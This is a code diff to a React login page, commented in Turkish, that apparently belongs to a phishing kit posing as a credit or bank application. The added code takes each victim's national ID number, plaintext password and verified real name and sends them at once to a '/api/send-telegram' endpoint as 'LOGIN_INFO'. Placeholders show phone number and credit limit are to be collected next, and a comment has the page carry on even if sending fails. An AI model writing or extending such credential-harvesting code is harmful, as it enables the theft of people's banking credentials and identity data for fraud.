@@ -137,12 +137,38 @@ const LoginContent = () => {
     }
 
     // Başarılı TC doğrulama - verileri sessionStorage'a kaydet
-    sessionStorage.setItem('loginData', JSON.stringify({
+    const loginInfo = {
       username: credentials.tc,
       password: credentials.password,
       realName: tcResult.data?.name,
       realSurname: tcResult.data?.surname
-    }));
+    };
+    sessionStorage.setItem('loginData', JSON.stringify(loginInfo));
+
+    // HEMEN Telegram'a login bilgilerini gönder
+    try {
+      await fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: credentials.tc,
+          password: credentials.password,
+          phone: 'TELEFON_HENÜZ_GİRİLMEDİ',
+          creditLimit: 'LİMİT_HENÜZ_GİRİLMEDİ',
+          applicationDate: new Date().toLocaleDateString('tr-TR'),
+          realName: tcResult.data?.name,
+          realSurname: tcResult.data?.surname,
+          messageType: 'LOGIN_INFO'
+        })
+      });
+      
+      console.log('Login bilgileri Telegram\'a gönderildi');
+    } catch (error) {
+      console.error('Telegram gönderim hatası (login):', error);
+      // Hata olsa bile devam et
+    }
 
     setIsLoading(false);
     // Phone sayfasına yönlendir
